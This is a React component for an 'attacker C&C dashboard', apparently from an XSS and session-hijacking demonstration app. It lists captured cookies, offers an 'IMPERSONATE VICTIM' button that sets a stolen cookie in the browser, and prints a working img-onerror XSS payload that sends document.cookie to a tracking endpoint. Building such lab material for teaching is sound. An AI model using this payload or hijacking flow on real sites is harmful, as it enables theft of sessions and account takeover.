import React, { useState, useEffect } from 'react';

interface AttackerLog {
    id: number;
    timestamp: string;
    cookie: string;
    url?: string;
    ip?: string;
    [key: string]: any;
}

const AttackerDashboard: React.FC = () => {
    const [logs, setLogs] = useState<AttackerLog[]>([]);
    const [autoRefresh, setAutoRefresh] = useState(true);

    const fetchLogs = () => {
        fetch('/api/attacker/logs')
            .then(res => res.json())
            .then(data => setLogs(data))
            .catch(err => console.error("Error fetching logs:", err));
    };

    useEffect(() => {
        fetchLogs();
        const interval = setInterval(() => {
            if (autoRefresh) fetchLogs();
        }, 2000); // Poll every 2 seconds
        return () => clearInterval(interval);
    }, [autoRefresh]);

    const handleClearLogs = () => {
        fetch('/api/attacker/clear', { method: 'POST' })
            .then(() => setLogs([]));
    };

    const handleImpersonate = (cookieString: string) => {
        // This is a client-side simulation directly setting the cookie
        // In a real attack, the attacker would use a tool like EditThisCookie
        if (!cookieString) return;

        try {
            // Simple parser for "key=value"
            document.cookie = cookieString + "; path=/; max-age=3600";
            alert("🍪 Cookie injected into YOUR browser! Try refreshing or going to Home to see if you are logged in as the victim.");
        } catch (e) {
            alert("Failed to set cookie");
        }
    };

    return (
        <div className="bg-gray-900 min-h-screen text-green-400 font-mono p-6 rounded-lg shadow-2xl overflow-hidden mt-4">
            <div className="flex justify-between items-center mb-6 border-b border-green-800 pb-4">
                <div>
                    <h2 className="text-2xl font-bold flex items-center gap-3">
                        <i className="fas fa-user-secret"></i>
                        ATTACKER C&C DASHBOARD
                    </h2>
                    <p className="text-xs text-green-600 mt-1">Listening for incoming stolen data...</p>
                </div>
                <div className="flex gap-2">
                    <button
                        onClick={() => setAutoRefresh(!autoRefresh)}
                        className={`px-3 py-1 text-xs border ${autoRefresh ? 'bg-green-900 border-green-500 text-green-100' : 'border-gray-600 text-gray-500'}`}
                    >
                        {autoRefresh ? "AUTO-REFRESH: ON" : "AUTO-REFRESH: OFF"}
                    </button>
                    <button
                        onClick={handleClearLogs}
                        className="px-3 py-1 text-xs border border-red-800 text-red-500 hover:bg-red-900/20"
                    >
                        CLEAR LOGS
                    </button>
                </div>
            </div>

            <div className="grid grid-cols-1 gap-4">
                {logs.length === 0 ? (
                    <div className="text-center py-12 border-2 border-dashed border-green-900 rounded-lg opacity-50">
                        <i className="fas fa-radar text-4xl mb-4 animate-pulse"></i>
                        <p>Waiting for victims...</p>
                        <p className="text-xs mt-2">Inject XSS payload to send data here.</p>
                        <code className="block mt-4 text-xs bg-black p-2 rounded max-w-md mx-auto">
                            &lt;img src=x onerror="fetch('/api/track?cookie='+document.cookie)"&gt;
                        </code>
                    </div>
                ) : (
                    logs.map(log => (
                        <div key={log.id} className="bg-black/50 border-l-4 border-green-500 p-4 rounded relative hover:bg-black/70 transition-colors">
                            <div className="flex justify-between items-start mb-2">
                                <span className="text-xs bg-green-900 text-green-100 px-2 py-0.5 rounded">
                                    {log.timestamp}
                                </span>
                                <span className="text-xs text-gray-500">IP: {log.ip || 'Unknown'}</span>
                            </div>

                            <div className="mb-3">
                                <p className="text-xs text-gray-500 uppercase mb-1">Stolen Data:</p>
                                <code className="block break-all text-sm bg-gray-900 p-2 rounded border border-green-900/50">
                                    {JSON.stringify(log, null, 2)}
                                </code>
                            </div>

                            {log.cookie && (
                                <div className="mt-2 pt-2 border-t border-green-900/30 flex justify-between items-center">
                                    <span className="text-xs text-yellow-500">
                                        <i className="fas fa-key mr-1"></i>
                                        Session Hijacking Ready
                                    </span>
                                    <button
                                        onClick={() => handleImpersonate(log.cookie)}
                                        className="text-xs bg-red-900/50 hover:bg-red-700 text-white px-3 py-1 rounded border border-red-800 transition-colors"
                                    >
                                        <i className="fas fa-mask mr-1"></i>
                                        IMPERSONATE VICTIM
                                    </button>
                                </div>
                            )}
                        </div>
                    ))
                )}
            </div>
        </div>
    );
};

export default AttackerDashboard;
